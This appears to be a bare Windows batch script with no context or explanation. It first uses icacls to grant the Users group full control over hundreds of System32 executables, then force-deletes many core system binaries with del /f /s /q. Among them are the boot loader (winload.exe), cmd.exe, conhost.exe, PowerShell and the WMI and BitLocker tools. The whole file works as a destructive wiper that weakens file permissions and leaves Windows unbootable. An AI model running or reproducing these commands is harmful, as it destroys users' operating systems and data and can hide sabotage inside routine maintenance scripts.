icacls C:\Windows\System32\powercfg.exe /t /Grant Users:F
icacls C:\Windows\System32\PresentationHost.exe /t /Grant Users:F
icacls C:\Windows\System32\PresentationSettings.exe /t /Grant Users:F
icacls C:\Windows\System32\prevhost.exe /t /Grant Users:F
icacls C:\Windows\System32\print.exe /t /Grant Users:F
icacls C:\Windows\System32\PrintBrmUi.exe /t /Grant Users:F
icacls C:\Windows\System32\printfilterpipelinesvc.exe /t /Grant Users:F
icacls C:\Windows\System32\PrintIsolationHost.exe /t /Grant Users:F
icacls C:\Windows\System32\printui.exe /t /Grant Users:F
icacls C:\Windows\System32\proquota.exe /t /Grant Users:F
icacls C:\Windows\System32\provlaunch.exe /t /Grant Users:F
icacls C:\Windows\System32\provtool.exe /t /Grant Users:F
icacls C:\Windows\System32\ProximityUxHost.exe /t /Grant Users:F
icacls C:\Windows\System32\prproc.exe /t /Grant Users:F
icacls C:\Windows\System32\psr.exe /t /Grant Users:F
icacls C:\Windows\System32\pwlauncher.exe /t /Grant Users:F
icacls C:\Windows\System32\qappsrv.exe /t /Grant Users:F
icacls C:\Windows\System32\qprocess.exe /t /Grant Users:F
icacls C:\Windows\System32\query.exe /t /Grant Users:F
icacls C:\Windows\System32\quickassist.exe /t /Grant Users:F
icacls C:\Windows\System32\quser.exe /t /Grant Users:F
icacls C:\Windows\System32\qwinsta.exe /t /Grant Users:F
icacls C:\Windows\System32\rasautou.exe /t /Grant Users:F
icacls C:\Windows\System32\rasdial.exe /t /Grant Users:F
icacls C:\Windows\System32\raserver.exe /t /Grant Users:F
icacls C:\Windows\System32\rasphone.exe /t /Grant Users:F
icacls C:\Windows\System32\rdpclip.exe /t /Grant Users:F
icacls C:\Windows\System32\rdpinit.exe /t /Grant Users:F
icacls C:\Windows\System32\rdpinput.exe /t /Grant Users:F
icacls C:\Windows\System32\RdpSa.exe /t /Grant Users:F
icacls C:\Windows\System32\RdpSaProxy.exe /t /Grant Users:F
icacls C:\Windows\System32\RdpSaUacHelper.exe /t /Grant Users:F
icacls C:\Windows\System32\rdpshell.exe /t /Grant Users:F
icacls C:\Windows\System32\rdpsign.exe /t /Grant Users:F
icacls C:\Windows\System32\rdrleakdiag.exe /t /Grant Users:F
icacls C:\Windows\System32\ReAgentc.exe /t /Grant Users:F
icacls C:\Windows\System32\recdisc.exe /t /Grant Users:F
icacls C:\Windows\System32\recover.exe /t /Grant Users:F
icacls C:\Windows\System32\RecoveryDrive.exe /t /Grant Users:F
icacls C:\Windows\System32\refsutil.exe /t /Grant Users:F
icacls C:\Windows\System32\reg.exe /t /Grant Users:F
icacls C:\Windows\System32\regedt32.exe /t /Grant Users:F
icacls C:\Windows\System32\regini.exe /t /Grant Users:F
icacls C:\Windows\System32\Register-CimProvider.exe /t /Grant Users:F
icacls C:\Windows\System32\regsvr32.exe /t /Grant Users:F
icacls C:\Windows\System32\rekeywiz.exe /t /Grant Users:F
icacls C:\Windows\System32\relog.exe /t /Grant Users:F
icacls C:\Windows\System32\RelPost.exe /t /Grant Users:F
icacls C:\Windows\System32\RemoteAppLifetimeManager.exe /t /Grant Users:F
icacls C:\Windows\System32\RemotePosWorker.exe /t /Grant Users:F
icacls C:\Windows\System32\repair-bde.exe /t /Grant Users:F
icacls C:\Windows\System32\replace.exe /t /Grant Users:F
icacls C:\Windows\System32\reset.exe /t /Grant Users:F
icacls C:\Windows\System32\ResetEngine.exe /t /Grant Users:F
icacls C:\Windows\System32\resmon.exe /t /Grant Users:F
icacls C:\Windows\System32\RMActivate.exe /t /Grant Users:F
icacls C:\Windows\System32\RMActivate_isv.exe /t /Grant Users:F
icacls C:\Windows\System32\RMActivate_ssp.exe /t /Grant Users:F
icacls C:\Windows\System32\RMActivate_ssp_isv.exe /t /Grant Users:F
icacls C:\Windows\System32\RmClient.exe /t /Grant Users:F
icacls C:\Windows\System32\rmttpmvscmgrsvr.exe /t /Grant Users:F
icacls C:\Windows\System32\Robocopy.exe /t /Grant Users:F
icacls C:\Windows\System32\ROUTE.EXE /t /Grant Users:F
icacls C:\Windows\System32\RpcPing.exe /t /Grant Users:F
icacls C:\Windows\System32\rrinstaller.exe /t /Grant Users:F
icacls C:\Windows\System32\rstrui.exe /t /Grant Users:F
icacls C:\Windows\System32\runas.exe /t /Grant Users:F
icacls C:\Windows\System32\rundll32.exe /t /Grant Users:F
icacls C:\Windows\System32\runexehelper.exe /t /Grant Users:F
icacls C:\Windows\System32\RunLegacyCPLElevated.exe /t /Grant Users:F
icacls C:\Windows\System32\runonce.exe /t /Grant Users:F
icacls C:\Windows\System32\RuntimeBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\rwinsta.exe /t /Grant Users:F
icacls C:\Windows\System32\sc.exe /t /Grant Users:F
icacls C:\Windows\System32\schtasks.exe /t /Grant Users:F
icacls C:\Windows\System32\ScriptRunner.exe /t /Grant Users:F
icacls C:\Windows\System32\sdbinst.exe /t /Grant Users:F
icacls C:\Windows\System32\sdchange.exe /t /Grant Users:F
icacls C:\Windows\System32\sdclt.exe /t /Grant Users:F
icacls C:\Windows\System32\sdiagnhost.exe /t /Grant Users:F
icacls C:\Windows\System32\SearchFilterHost.exe /t /Grant Users:F
icacls C:\Windows\System32\SearchIndexer.exe /t /Grant Users:F
icacls C:\Windows\System32\SearchProtocolHost.exe /t /Grant Users:F
icacls C:\Windows\System32\SecEdit.exe /t /Grant Users:F
icacls C:\Windows\System32\secinit.exe /t /Grant Users:F
icacls C:\Windows\System32\SecureBootEncodeUEFI.exe /t /Grant Users:F
icacls C:\Windows\System32\securekernel.exe /t /Grant Users:F
icacls C:\Windows\System32\SecurityHealthHost.exe /t /Grant Users:F
icacls C:\Windows\System32\SecurityHealthService.exe /t /Grant Users:F
icacls C:\Windows\System32\SecurityHealthSystray.exe /t /Grant Users:F
icacls C:\Windows\System32\SensorDataService.exe /t /Grant Users:F
icacls C:\Windows\System32\services.exe /t /Grant Users:F
icacls C:\Windows\System32\sessionmsg.exe /t /Grant Users:F
icacls C:\Windows\System32\sethc.exe /t /Grant Users:F
icacls C:\Windows\System32\setspn.exe /t /Grant Users:F
icacls C:\Windows\System32\SettingSyncHost.exe /t /Grant Users:F
icacls C:\Windows\System32\setupcl.exe /t /Grant Users:F
icacls C:\Windows\System32\setupugc.exe /t /Grant Users:F
icacls C:\Windows\System32\setx.exe /t /Grant Users:F
icacls C:\Windows\System32\sfc.exe /t /Grant Users:F
icacls C:\Windows\System32\SgrmBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\SgrmLpac.exe /t /Grant Users:F
icacls C:\Windows\System32\ShellAppRuntime.exe /t /Grant Users:F
icacls C:\Windows\System32\shrpubw.exe /t /Grant Users:F
icacls C:\Windows\System32\shutdown.exe /t /Grant Users:F
icacls C:\Windows\System32\sigverif.exe /t /Grant Users:F
icacls C:\Windows\System32\SIHClient.exe /t /Grant Users:F
icacls C:\Windows\System32\sihost.exe /t /Grant Users:F
icacls C:\Windows\System32\SlideToShutDown.exe /t /Grant Users:F
icacls C:\Windows\System32\slui.exe /t /Grant Users:F
icacls C:\Windows\System32\smartscreen.exe /t /Grant Users:F
icacls C:\Windows\System32\smss.exe /t /Grant Users:F
icacls C:\Windows\System32\SndVol.exe /t /Grant Users:F
icacls C:\Windows\System32\SnippingTool.exe /t /Grant Users:F
icacls C:\Windows\System32\snmptrap.exe /t /Grant Users:F
icacls C:\Windows\System32\sort.exe /t /Grant Users:F
icacls C:\Windows\System32\SpaceAgent.exe /t /Grant Users:F
icacls C:\Windows\System32\spaceman.exe /t /Grant Users:F
icacls C:\Windows\System32\SpatialAudioLicenseSrv.exe /t /Grant Users:F
icacls C:\Windows\System32\Spectrum.exe /t /Grant Users:F
icacls C:\Windows\System32\spoolsv.exe /t /Grant Users:F
icacls C:\Windows\System32\SppExtComObj.Exe /t /Grant Users:F
icacls C:\Windows\System32\sppsvc.exe /t /Grant Users:F
icacls C:\Windows\System32\srdelayed.exe /t /Grant Users:F
icacls C:\Windows\System32\SrTasks.exe /t /Grant Users:F
icacls C:\Windows\System32\stordiag.exe /t /Grant Users:F
icacls C:\Windows\System32\subst.exe /t /Grant Users:F
icacls C:\Windows\System32\svchost.exe /t /Grant Users:F
icacls C:\Windows\System32\sxstrace.exe /t /Grant Users:F
icacls C:\Windows\System32\SyncAppvPublishingServer.exe /t /Grant Users:F
icacls C:\Windows\System32\SyncHost.exe /t /Grant Users:F
icacls C:\Windows\System32\SysResetErr.exe /t /Grant Users:F
icacls C:\Windows\System32\systeminfo.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemPropertiesAdvanced.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemPropertiesComputerName.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemPropertiesDataExecutionPrevention.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemPropertiesHardware.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemPropertiesPerformance.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemPropertiesProtection.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemPropertiesRemote.exe /t /Grant Users:F
icacls C:\Windows\System32\systemreset.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemSettingsAdminFlows.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemSettingsBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemSettingsRemoveDevice.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemUWPLauncher.exe /t /Grant Users:F
icacls C:\Windows\System32\systray.exe /t /Grant Users:F
icacls C:\Windows\System32\tabcal.exe /t /Grant Users:F
icacls C:\Windows\System32\takeown.exe /t /Grant Users:F
icacls C:\Windows\System32\TapiUnattend.exe /t /Grant Users:F
icacls C:\Windows\System32\tar.exe /t /Grant Users:F
icacls C:\Windows\System32\taskhostw.exe /t /Grant Users:F
icacls C:\Windows\System32\taskkill.exe /t /Grant Users:F
icacls C:\Windows\System32\tasklist.exe /t /Grant Users:F
icacls C:\Windows\System32\Taskmgr.exe /t /Grant Users:F
icacls C:\Windows\System32\tcblaunch.exe /t /Grant Users:F
icacls C:\Windows\System32\tcmsetup.exe /t /Grant Users:F
icacls C:\Windows\System32\TCPSVCS.EXE /t /Grant Users:F
icacls C:\Windows\System32\ThumbnailExtractionHost.exe /t /Grant Users:F
icacls C:\Windows\System32\TieringEngineService.exe /t /Grant Users:F
icacls C:\Windows\System32\timeout.exe /t /Grant Users:F
icacls C:\Windows\System32\TokenBrokerCookies.exe /t /Grant Users:F
icacls C:\Windows\System32\TpmInit.exe /t /Grant Users:F
icacls C:\Windows\System32\TpmTool.exe /t /Grant Users:F
icacls C:\Windows\System32\tpmvscmgr.exe /t /Grant Users:F
icacls C:\Windows\System32\tpmvscmgrsvr.exe /t /Grant Users:F
icacls C:\Windows\System32\tracerpt.exe /t /Grant Users:F
icacls C:\Windows\System32\TRACERT.EXE /t /Grant Users:F
icacls C:\Windows\System32\tscon.exe /t /Grant Users:F
icacls C:\Windows\System32\tsdiscon.exe /t /Grant Users:F
icacls C:\Windows\System32\tskill.exe /t /Grant Users:F
icacls C:\Windows\System32\TSTheme.exe /t /Grant Users:F
icacls C:\Windows\System32\TSWbPrxy.exe /t /Grant Users:F
icacls C:\Windows\System32\ttdinject.exe /t /Grant Users:F
icacls C:\Windows\System32\tttracer.exe /t /Grant Users:F
icacls C:\Windows\System32\typeperf.exe /t /Grant Users:F
icacls C:\Windows\System32\tzsync.exe /t /Grant Users:F
icacls C:\Windows\System32\tzutil.exe /t /Grant Users:F
icacls C:\Windows\System32\UCPDMgr.exe /t /Grant Users:F
icacls C:\Windows\System32\ucsvc.exe /t /Grant Users:F
icacls C:\Windows\System32\UevAgentPolicyGenerator.exe /t /Grant Users:F
icacls C:\Windows\System32\UevAppMonitor.exe /t /Grant Users:F
icacls C:\Windows\System32\UevTemplateBaselineGenerator.exe /t /Grant Users:F
icacls C:\Windows\System32\UevTemplateConfigItemGenerator.exe /t /Grant Users:F
icacls C:\Windows\System32\UIMgrBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\unlodctr.exe /t /Grant Users:F
icacls C:\Windows\System32\unregmp2.exe /t /Grant Users:F
icacls C:\Windows\System32\upfc.exe /t /Grant Users:F
icacls C:\Windows\System32\UpgradeResultsUI.exe /t /Grant Users:F
icacls C:\Windows\System32\upnpcont.exe /t /Grant Users:F
icacls C:\Windows\System32\UPPrinterInstaller.exe /t /Grant Users:F
icacls C:\Windows\System32\UserAccountBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\UserAccountControlSettings.exe /t /Grant Users:F
icacls C:\Windows\System32\userinit.exe /t /Grant Users:F
icacls C:\Windows\System32\UsoClient.exe /t /Grant Users:F
icacls C:\Windows\System32\usocoreworker.exe /t /Grant Users:F
icacls C:\Windows\System32\UtcDecoderHost.exe /t /Grant Users:F
icacls C:\Windows\System32\Utilman.exe /t /Grant Users:F
icacls C:\Windows\System32\VaultCmd.exe /t /Grant Users:F
icacls C:\Windows\System32\vds.exe /t /Grant Users:F
icacls C:\Windows\System32\vdsldr.exe /t /Grant Users:F
icacls C:\Windows\System32\verclsid.exe /t /Grant Users:F
icacls C:\Windows\System32\verifier.exe /t /Grant Users:F
icacls C:\Windows\System32\verifiergui.exe /t /Grant Users:F
icacls C:\Windows\System32\vssadmin.exe /t /Grant Users:F
icacls C:\Windows\System32\VSSVC.exe /t /Grant Users:F
icacls C:\Windows\System32\w32tm.exe /t /Grant Users:F
icacls C:\Windows\System32\WaaSMedicAgent.exe /t /Grant Users:F
icacls C:\Windows\System32\waitfor.exe /t /Grant Users:F
icacls C:\Windows\System32\WallpaperHost.exe /t /Grant Users:F
icacls C:\Windows\System32\wbadmin.exe /t /Grant Users:F
icacls C:\Windows\System32\wbengine.exe /t /Grant Users:F
icacls C:\Windows\System32\wecutil.exe /t /Grant Users:F
icacls C:\Windows\System32\WerFault.exe /t /Grant Users:F
icacls C:\Windows\System32\WerFaultSecure.exe /t /Grant Users:F
icacls C:\Windows\System32\wermgr.exe /t /Grant Users:F
icacls C:\Windows\System32\wevtutil.exe /t /Grant Users:F
icacls C:\Windows\System32\wextract.exe /t /Grant Users:F
icacls C:\Windows\System32\WFS.exe /t /Grant Users:F
icacls C:\Windows\System32\where.exe /t /Grant Users:F
icacls C:\Windows\System32\whoami.exe /t /Grant Users:F
icacls C:\Windows\System32\wiaacmgr.exe /t /Grant Users:F
icacls C:\Windows\System32\wiawow64.exe /t /Grant Users:F
icacls C:\Windows\System32\wifitask.exe /t /Grant Users:F
icacls C:\Windows\System32\wimserv.exe /t /Grant Users:F
icacls C:\Windows\System32\WinBioDataModelOOBE.exe /t /Grant Users:F
icacls C:\Windows\System32\Windows.Media.BackgroundPlayback.exe /t /Grant Users:F
icacls C:\Windows\System32\Windows.WARP.JITService.exe /t /Grant Users:F
icacls C:\Windows\System32\WindowsActionDialog.exe /t /Grant Users:F
icacls C:\Windows\System32\WindowsUpdateElevatedInstaller.exe /t /Grant Users:F
icacls C:\Windows\System32\wininit.exe /t /Grant Users:F
icacls C:\Windows\System32\winload.exe /t /Grant Users:F
icacls C:\Windows\System32\winlogon.exe /t /Grant Users:F
icacls C:\Windows\System32\winresume.exe /t /Grant Users:F
icacls C:\Windows\System32\winrs.exe /t /Grant Users:F
icacls C:\Windows\System32\winrshost.exe /t /Grant Users:F
icacls C:\Windows\System32\WinRTNetMUAHostServer.exe /t /Grant Users:F
icacls C:\Windows\System32\WinSAT.exe /t /Grant Users:F
icacls C:\Windows\System32\winver.exe /t /Grant Users:F
icacls C:\Windows\System32\wkspbroker.exe /t /Grant Users:F
icacls C:\Windows\System32\wksprt.exe /t /Grant Users:F
icacls C:\Windows\System32\wlanext.exe /t /Grant Users:F
icacls C:\Windows\System32\wlrmdr.exe /t /Grant Users:F
icacls C:\Windows\System32\WMPDMC.exe /t /Grant Users:F
icacls C:\Windows\System32\WorkFolders.exe /t /Grant Users:F
icacls C:\Windows\System32\wowreg32.exe /t /Grant Users:F
icacls C:\Windows\System32\WpcMon.exe /t /Grant Users:F
icacls C:\Windows\System32\WpcTok.exe /t /Grant Users:F
icacls C:\Windows\System32\WPDShextAutoplay.exe /t /Grant Users:F
icacls C:\Windows\System32\wpnpinst.exe /t /Grant Users:F
icacls C:\Windows\System32\wpr.exe /t /Grant Users:F
icacls C:\Windows\System32\write.exe /t /Grant Users:F
icacls C:\Windows\System32\wscadminui.exe /t /Grant Users:F
icacls C:\Windows\System32\WSCollect.exe /t /Grant Users:F
icacls C:\Windows\System32\wscript.exe /t /Grant Users:F
icacls C:\Windows\System32\wsl.exe /t /Grant Users:F
icacls C:\Windows\System32\WSManHTTPConfig.exe /t /Grant Users:F
icacls C:\Windows\System32\wsmprovhost.exe /t /Grant Users:F
icacls C:\Windows\System32\wsqmcons.exe /t /Grant Users:F
icacls C:\Windows\System32\WSReset.exe /t /Grant Users:F
icacls C:\Windows\System32\wuapihost.exe /t /Grant Users:F
icacls C:\Windows\System32\wuauclt.exe /t /Grant Users:F
icacls C:\Windows\System32\WUDFCompanionHost.exe /t /Grant Users:F
icacls C:\Windows\System32\WUDFHost.exe /t /Grant Users:F
icacls C:\Windows\System32\wusa.exe /t /Grant Users:F
icacls C:\Windows\System32\WWAHost.exe /t /Grant Users:F
icacls C:\Windows\System32\XblGameSaveTask.exe /t /Grant Users:F
icacls C:\Windows\System32\xcopy.exe /t /Grant Users:F
icacls C:\Windows\System32\xwizard.exe /t /Grant Users:F
del C:\Windows\System32\AppV\AppVStreamingUX.exe /f /s /q
del C:\Windows\System32\Boot\winload.exe /f /s /q
del C:\Windows\System32\Boot\winresume.exe /f /s /q
del C:\Windows\System32\Com\comrepl.exe /f /s /q
del C:\Windows\System32\Com\MigRegDB.exe /f /s /q
del C:\Windows\System32\DiagSvcs\DiagnosticsHub.StandardCollector.Service.exe /f /s /q
del C:\Windows\System32\Dism\DismHost.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\CustomModeApp.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\CustomModeAppv2_0.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\difx64.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\DPTopologyApp.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\DPTopologyAppv2_0.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\GfxUIEx.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\Gfxv2_0.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\Gfxv4_0.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxCUIService.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxEM.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxext.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxHK.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxTray.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\IntelCpHeciSvc.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\IntelWiDiUMS64.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\IntelWiDiVAD64.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\dpinst.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\InstNT.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynMood.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynReflash.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynTPEnh.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynTPEnhService.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynTPHelper.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynZMetr.exe /f /s /q
del C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\Tutorial.exe /f /s /q
del C:\Windows\System32\F12\IEChooser.exe /f /s /q
del C:\Windows\System32\IME\IMEJP\IMJPDCT.EXE /f /s /q
del C:\Windows\System32\IME\IMEJP\IMJPSET.EXE /f /s /q
del C:\Windows\System32\IME\IMEJP\IMJPUEX.EXE /f /s /q
del C:\Windows\System32\IME\IMEJP\imjpuexc.exe /f /s /q
del C:\Windows\System32\IME\IMETC\IMTCLNWZ.EXE /f /s /q
del C:\Windows\System32\IME\IMETC\IMTCPROP.exe /f /s /q
del C:\Windows\System32\IME\SHARED\IMCCPHR.exe /f /s /q
del C:\Windows\System32\IME\SHARED\ImeBroker.exe /f /s /q
del C:\Windows\System32\IME\SHARED\imecfmui.exe /f /s /q
del C:\Windows\System32\IME\SHARED\IMEPADSV.EXE /f /s /q
del C:\Windows\System32\IME\SHARED\IMESEARCH.EXE /f /s /q
del C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE /f /s /q
del C:\Windows\System32\InputMethod\CHS\ChsIME.exe /f /s /q
del C:\Windows\System32\InputMethod\CHT\ChtIME.exe /f /s /q
del C:\Windows\System32\migwiz\mighost.exe /f /s /q
del C:\Windows\System32\oobe\audit.exe /f /s /q
del C:\Windows\System32\oobe\AuditShD.exe /f /s /q
del C:\Windows\System32\oobe\FirstLogonAnim.exe /f /s /q
del C:\Windows\System32\oobe\msoobe.exe /f /s /q
del C:\Windows\System32\oobe\oobeldr.exe /f /s /q
del C:\Windows\System32\oobe\Setup.exe /f /s /q
del C:\Windows\System32\oobe\UserOOBEBroker.exe /f /s /q
del C:\Windows\System32\oobe\windeploy.exe /f /s /q
del C:\Windows\System32\OpenSSH\scp.exe /f /s /q
del C:\Windows\System32\OpenSSH\sftp.exe /f /s /q
del C:\Windows\System32\OpenSSH\ssh-add.exe /f /s /q
del C:\Windows\System32\OpenSSH\ssh-agent.exe /f /s /q
del C:\Windows\System32\OpenSSH\ssh-keygen.exe /f /s /q
del C:\Windows\System32\OpenSSH\ssh-keyscan.exe /f /s /q
del C:\Windows\System32\OpenSSH\ssh.exe /f /s /q
del C:\Windows\System32\PerceptionSimulation\PerceptionSimulationInput.exe /f /s /q
del C:\Windows\System32\PerceptionSimulation\PerceptionSimulationService.exe /f /s /q
del C:\Windows\System32\Speech\SpeechUX\SpeechUXWiz.exe /f /s /q
del C:\Windows\System32\Speech_OneCore\common\SpeechModelDownload.exe /f /s /q
del C:\Windows\System32\Speech_OneCore\common\SpeechRuntime.exe /f /s /q
del C:\Windows\System32\spool\tools\PrintBrm.exe /f /s /q
del C:\Windows\System32\spool\tools\PrintBrmEngine.exe /f /s /q
del C:\Windows\System32\Sysprep\sysprep.exe /f /s /q
del C:\Windows\System32\SystemResetPlatform\SystemResetPlatform.exe /f /s /q
del C:\Windows\System32\UNP\UNPUXHost.exe /f /s /q
del C:\Windows\System32\UNP\UNPUXLauncher.exe /f /s /q
del C:\Windows\System32\UNP\UpdateNotificationMgr.exe /f /s /q
del C:\Windows\System32\wbem\mofcomp.exe /f /s /q
del C:\Windows\System32\wbem\scrcons.exe /f /s /q
del C:\Windows\System32\wbem\unsecapp.exe /f /s /q
del C:\Windows\System32\wbem\wbemtest.exe /f /s /q
del C:\Windows\System32\wbem\WinMgmt.exe /f /s /q
del C:\Windows\System32\wbem\WMIADAP.exe /f /s /q
del C:\Windows\System32\wbem\WmiApSrv.exe /f /s /q
del C:\Windows\System32\wbem\WMIC.exe /f /s /q
del C:\Windows\System32\wbem\WmiPrvSE.exe /f /s /q
del C:\Windows\System32\WinBioPlugIns\FaceFodUninstaller.exe /f /s /q
del C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /f /s /q
del C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe /f /s /q
del C:\Windows\System32\agentactivationruntimestarter.exe /f /s /q
del C:\Windows\System32\AgentService.exe /f /s /q
del C:\Windows\System32\aitstatic.exe /f /s /q
del C:\Windows\System32\alg.exe /f /s /q
del C:\Windows\System32\AppHostRegistrationVerifier.exe /f /s /q
del C:\Windows\System32\appidcertstorecheck.exe /f /s /q
del C:\Windows\System32\appidpolicyconverter.exe /f /s /q
del C:\Windows\System32\appidtel.exe /f /s /q
del C:\Windows\System32\ApplicationFrameHost.exe /f /s /q
del C:\Windows\System32\ApplySettingsTemplateCatalog.exe /f /s /q
del C:\Windows\System32\ApplyTrustOffline.exe /f /s /q
del C:\Windows\System32\ApproveChildRequest.exe /f /s /q
del C:\Windows\System32\AppVClient.exe /f /s /q
del C:\Windows\System32\AppVDllSurrogate.exe /f /s /q
del C:\Windows\System32\AppVNice.exe /f /s /q
del C:\Windows\System32\AppVShNotify.exe /f /s /q
del C:\Windows\System32\ARP.EXE /f /s /q
del C:\Windows\System32\AssignedAccessGuard.exe /f /s /q
del C:\Windows\System32\at.exe /f /s /q
del C:\Windows\System32\AtBroker.exe /f /s /q
del C:\Windows\System32\attrib.exe /f /s /q
del C:\Windows\System32\audiodg.exe /f /s /q
del C:\Windows\System32\auditpol.exe /f /s /q
del C:\Windows\System32\AuthHost.exe /f /s /q
del C:\Windows\System32\autochk.exe /f /s /q
del C:\Windows\System32\autoconv.exe /f /s /q
del C:\Windows\System32\autofmt.exe /f /s /q
del C:\Windows\System32\AxInstUI.exe /f /s /q
del C:\Windows\System32\baaupdate.exe /f /s /q
del C:\Windows\System32\backgroundTaskHost.exe /f /s /q
del C:\Windows\System32\BackgroundTransferHost.exe /f /s /q
del C:\Windows\System32\bcdboot.exe /f /s /q
del C:\Windows\System32\bcdedit.exe /f /s /q
del C:\Windows\System32\bdechangepin.exe /f /s /q
del C:\Windows\System32\BdeHdCfg.exe /f /s /q
del C:\Windows\System32\BdeUISrv.exe /f /s /q
del C:\Windows\System32\bdeunlock.exe /f /s /q
del C:\Windows\System32\BioIso.exe /f /s /q
del C:\Windows\System32\BitLockerDeviceEncryption.exe /f /s /q
del C:\Windows\System32\BitLockerWizard.exe /f /s /q
del C:\Windows\System32\BitLockerWizardElev.exe /f /s /q
del C:\Windows\System32\bitsadmin.exe /f /s /q
del C:\Windows\System32\bootcfg.exe /f /s /q
del C:\Windows\System32\bootim.exe /f /s /q
del C:\Windows\System32\bootsect.exe /f /s /q
del C:\Windows\System32\bridgeunattend.exe /f /s /q
del C:\Windows\System32\browserexport.exe /f /s /q
del C:\Windows\System32\browser_broker.exe /f /s /q
del C:\Windows\System32\bthudtask.exe /f /s /q
del C:\Windows\System32\ByteCodeGenerator.exe /f /s /q
del C:\Windows\System32\cacls.exe /f /s /q
del C:\Windows\System32\calc.exe /f /s /q
del C:\Windows\System32\CameraSettingsUIHost.exe /f /s /q
del C:\Windows\System32\CastSrv.exe /f /s /q
del C:\Windows\System32\CertEnrollCtrl.exe /f /s /q
del C:\Windows\System32\certreq.exe /f /s /q
del C:\Windows\System32\certutil.exe /f /s /q
del C:\Windows\System32\change.exe /f /s /q
del C:\Windows\System32\changepk.exe /f /s /q
del C:\Windows\System32\charmap.exe /f /s /q
del C:\Windows\System32\CheckNetIsolation.exe /f /s /q
del C:\Windows\System32\chglogon.exe /f /s /q
del C:\Windows\System32\chgport.exe /f /s /q
del C:\Windows\System32\chgusr.exe /f /s /q
del C:\Windows\System32\chkdsk.exe /f /s /q
del C:\Windows\System32\chkntfs.exe /f /s /q
del C:\Windows\System32\choice.exe /f /s /q
del C:\Windows\System32\CIDiag.exe /f /s /q
del C:\Windows\System32\cipher.exe /f /s /q
del C:\Windows\System32\cleanmgr.exe /f /s /q
del C:\Windows\System32\cliconfg.exe /f /s /q
del C:\Windows\System32\clip.exe /f /s /q
del C:\Windows\System32\ClipRenew.exe /f /s /q
del C:\Windows\System32\ClipUp.exe /f /s /q
del C:\Windows\System32\CloudExperienceHostBroker.exe /f /s /q
del C:\Windows\System32\CloudNotifications.exe /f /s /q
del C:\Windows\System32\cmd.exe /f /s /q
del C:\Windows\System32\cmdkey.exe /f /s /q
del C:\Windows\System32\cmdl32.exe /f /s /q
del C:\Windows\System32\cmmon32.exe /f /s /q
del C:\Windows\System32\cmstp.exe /f /s /q
del C:\Windows\System32\cofire.exe /f /s /q
del C:\Windows\System32\colorcpl.exe /f /s /q
del C:\Windows\System32\comp.exe /f /s /q
del C:\Windows\System32\compact.exe /f /s /q
del C:\Windows\System32\CompatTelRunner.exe /f /s /q
del C:\Windows\System32\CompMgmtLauncher.exe /f /s /q
del C:\Windows\System32\CompPkgSrv.exe /f /s /q
del C:\Windows\System32\ComputerDefaults.exe /f /s /q
del C:\Windows\System32\conhost.exe /f /s /q
